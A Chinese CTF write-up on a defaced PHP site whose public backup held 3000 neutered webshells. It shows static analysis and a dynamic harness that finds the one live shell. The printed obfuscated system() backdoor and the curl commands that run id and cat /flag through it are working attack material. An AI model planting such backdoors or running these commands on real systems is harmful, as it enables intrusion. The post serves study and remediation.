---
layout: post
title: 被植入 3000 个后门的站点：从源码备份到命令执行
summary: 站点只剩一页静态的“被黑”公告，顺手留下了 41MB 源码备份。3000 个同构后门全都做过加固，静态读代码一个都用不了——换成把每个文件真的跑一遍，只命中一个。
tags: CTF 代码审计 PHP 后门
date: 2026-10-21 10:00:00 +0800
---

打开目标只有一个页面，234 字节，两句话：网站已被黑，另外“特地备份了网站源码到 `www.tar.gz` 以供大家观赏”。

这不是一个还在运行的业务站点，是一个被打完、首页被换掉、文件还留在那儿的现场。有意思的地方在于：它把自己被入侵的痕迹原封不动地打包放了出来。

## 先把路由摸清

文件存不存在这件事，得先定一把尺子，否则后面全是猜。这台的规则很清楚：

| 请求 | 状态 | 响应体 | 说明 |
|---|---|---|---|
| `/flag` | 200 | 234B | 非 `.php` 一律回 index.html |
| `/.git/HEAD` | 200 | 234B | 同上，不代表有 .git |
| `/admin.php` | 404 | 169B | `.php` 走 PHP-FPM，不存在就是标准 404 |

一句话：非 `.php` 的路径没有判别力，`.php` 的 404 才是真信号。这也侧面说明 web 根目录下除了 index.html，剩下的全是 PHP 文件。

## 备份包

`GET /www.tar.gz` 返回 200，`Content-Length` 约 41MB。一次没下完，用 `curl -C -` 断点续传分几次取回，大小核对一致后解包。

```
tar tzf www.tar.gz | wc -l     # 3003
```

结构是扁平的：一个 `index.html`（就是那页公告），加 3000 个 11 位随机名的 PHP，单个 6.8KB 到 62KB。文件名首字符在大小写字母、数字、下划线之间均匀分布，没有任何命名规律。

## 三千个后门，五种加固

随便打开几个就能看出，这批文件是同一套模板批量生成的，只是变量名、函数名、参数名全部随机。危险调用几乎都被处理过，归纳成五类：

**恒假条件**：

```php
if ('exQzRWl7T' == 'qQDKt5OLj') {
    assert($_GET['p2'] ?? ' ');
}
```

两段随机串比较，要求相等。把全部文件里这种比较抓出来逐一核对，左右相同的数量是 0。

**参数先置空**：

```php
$_GET['jVMcNhK_F'] = ' ';
system($_GET['jVMcNhK_F'] ?? ' ');
```

传什么都会被前面那行覆盖成空格。

**函数存在性检查用随机名**：

```php
if (function_exists('RTqshRaSvWc')) {
    RTqshRaSvWc($tHmDQ);
}
```

把所有文件里 `function_exists` 的参数去重，没有一个命中内置可执行函数。

**sink 在没被调用的函数体里**：文件里定义了一堆随机名函数，危险调用在函数体内，末尾只调用了其中一部分，其余定义了从不执行。

**整段顶层代码被注释**。

## 静态统计：规模很大，可用为零

三千个文件手工看不现实，先做统计。用 PHP 的 `token_get_all` 把每个文件解析成 token，按花括号深度区分顶层和函数体，按语句起点判断有没有被 `if` 包住，按前置赋值判断参数有没有被覆盖：

| 指标 | 数量 |
|---|---|
| PHP 文件总数 | 3000 |
| 顶层 sink 调用 | 14147 |
| 顶层「没被守卫、也没被覆盖」的 sink | 0 |
| 函数体内 sink 调用 | 7160 |
| `function_exists` 参数命中内置执行函数 | 0 |
| 参数名为 1-3 字符（`cmd`、`pass`、`x` 这类） | 0 |

同时确认参数名全是 8-20 位随机串，不存在哪个作者“手留的短口令”。跨超全局变量的写法也统计过：`eval($_GET[...])` 四千多处、`eval($_POST[...])` 两千多处、`eval($var)` 两千多处，但它们同样落在那五种处理之下。

到这一步结论很明确：静态层面没有可直接用的调用点，也不可能靠猜参数名爆破 —— 3000 个文件乘上几十个随机参数，请求量根本不可接受。

## 换个问法：不读代码，直接跑

前面所有判断都基于“读出来的代码长什么样”。但读代码会漏东西，尤其当作者刻意改写函数名的写法时。所以换一个问法：**不问它看起来能不能用，直接把每个文件跑一遍，看有没有副作用。**

对每个文件：

1. 正则提出现过的全部 `$_GET` / `$_POST` / `$_REQUEST` / `$_COOKIE` 参数名；
2. 把这些参数名同时写进四个超全局变量，值统一给 `echo "M7k9X";`；
3. `ob_start()` 之后 `include` 目标文件，在正常返回处和 `register_shutdown_function` 里都检查缓冲区有没有出现 `M7k9X`；
4. 单文件限时 8 秒，避免某个文件死循环拖死整轮。

```php
<?php
error_reporting(0);
$f = $argv[1];
$names = json_decode($argv[2], true);
$P = 'echo "M7k9X";';
$_GET = []; $_POST = []; $_COOKIE = []; $_REQUEST = [];
foreach ($names as $n) { $_GET[$n] = $P; $_POST[$n] = $P; $_COOKIE[$n] = $P; $_REQUEST[$n] = $P; }
ob_start();
register_shutdown_function(function() use ($f) {
    if (strpos((string)ob_get_contents(), 'M7k9X') !== false) {
        echo "\n@@HIT@@ " . basename($f) . "\n";
    }
});
include $f;
if (strpos((string)ob_get_clean(), 'M7k9X') !== false) { echo "@@HIT@@ " . basename($f) . "\n"; }
```

3001 个文件跑完，只有 **1 个**命中。把它的随机文件名记作 `xxxx.php`，再对它做单参数循环，把参数定位到 `p1`。

## 那一个能用的，长什么样

```php
$XnEGfa = $_GET['p1'] ?? ' ';   // 参数没有被置空覆盖
$aYunX  = "sY";
$aYunX .= "stEmXnsTcx";
$aYunX  = explode('Xn', $aYunX);     // 拆出 "sYstEm"
$kDxfM  = new stdClass();
$kDxfM->gHht = $aYunX[0];
($kDxfM->gHht)($XnEGfa);             // 等价于 system($_GET['p1'])
```

它和其余 2999 个的区别只有三点：参数没被置空、调用点不在恒假分支里也不在没调用的函数里、函数名不是直接写出来的 —— 先字符串拼接，再用 `explode` 拆出 `sYstEm`，最后塞进对象属性做动态调用。

用 `grep system(` 或按关键字做正则替换式加固，这一处必然漏掉。这也是为什么前面那套静态统计给的是“0 个可用”，而不是真相。

## 复现

确认执行：

```bash
curl -sS -G 'http://<target>/xxxx.php' \
     --data-urlencode 'p1=echo MARKER_SYS_OK;id;whoami'
```

```
MARKER_SYS_OK
uid=82(www-data) gid=82(www-data) groups=82(www-data)
www-data
```

重复多次回显稳定。读 flag：

```bash
curl -sS -G 'http://<target>/xxxx.php' \
     --data-urlencode 'p1=echo "--FLAGPATH--";ls -l /flag*;echo "--FLAGVAL--";cat /flag'
```

```
--FLAGPATH--
-rw-r--r--    1 root     root            45 Oct 20 12:19 /flag
--FLAGVAL--
CTF{...}
```

## 一条死路，记下来省后来人

文件里还有大量 `assert($_GET['p2'] ?? ' ')`。线上 `zend.assertions` 是开着的（页面会输出 `assert(): ... failed` 的 warning，说明字符串参数确实被求值），一度以为这是第二个执行点：

```
GET /xxxx.php?p2=print("ASSERT_RCE_OK_".(7*7))
```

不回显。原因是同一个文件第 17 行已经有一句 `$_GET['p2'] = ' ';`，在 `assert` 之前就把参数覆盖成空格了 —— 断言确实执行了，只是执行的是空格。

另外抽查了另外几个文件（GET 与 POST 两种传参、注释内、恒假 if 内、跨超全局变量、反引号），页面都有正常输出说明文件确实被包含执行，但没有命令回显。结合本地扫描只有一个命中，可以确认这 3000 个里只剩这一处可用。

## 影响

不需要任何凭据：公开可下的备份包里带着参数名，直接就能以 `www-data` 执行系统命令。同权限下能读站点配置、数据库凭据、源码，能往 web 目录写文件，也可以作为进一步提权的起点。

## 修复建议

删除 web 根目录下全部 3000 个残留后门，从干净版本重新部署；排查入侵时间与写入入口（这批文件是批量生成的，说明此前已经拿到目录写权限），检查访问日志、计划任务、SSH 公钥和其它目录下的同类文件；立即移除 `www.tar.gz`；`disable_functions` 覆盖 `system`/`exec`/`shell_exec`/`passthru`/`popen`/`proc_open`/`eval`/`assert`，配 `open_basedir`；生产环境 `zend.assertions=-1`、`display_errors=Off`。加固后复测：`/xxxx.php?p1=id` 应返回 404 且不再出现 `uid=`，`/www.tar.gz` 应返回 404 或 403。

## 留在手里的三条

**代码读起来“不可能执行”，不等于它没在执行。** 这一轮的转折点不是更仔细地读，而是换了一个更直接的信号：不看它长什么样，看它跑起来有没有副作用。

**关键字扫描是有盲区的。** `system(` 搜不到字符串拼接出来的调用；按黑名单做替换式加固，同样会漏。看到“加固得很整齐”的时候，要怀疑的是加固方式，而不是运气。

**三千个同构目标不适合逐个人工分析，也不适合猜参数爆破。** 提参数名、批量执行、只看命中，一次就把范围收敛到一个文件、一个参数。

---

后续把这套“怎么决定下一步”的想法整理进了理论笔记：[攻防是不完全信息博弈](/theory/incomplete-information/)。
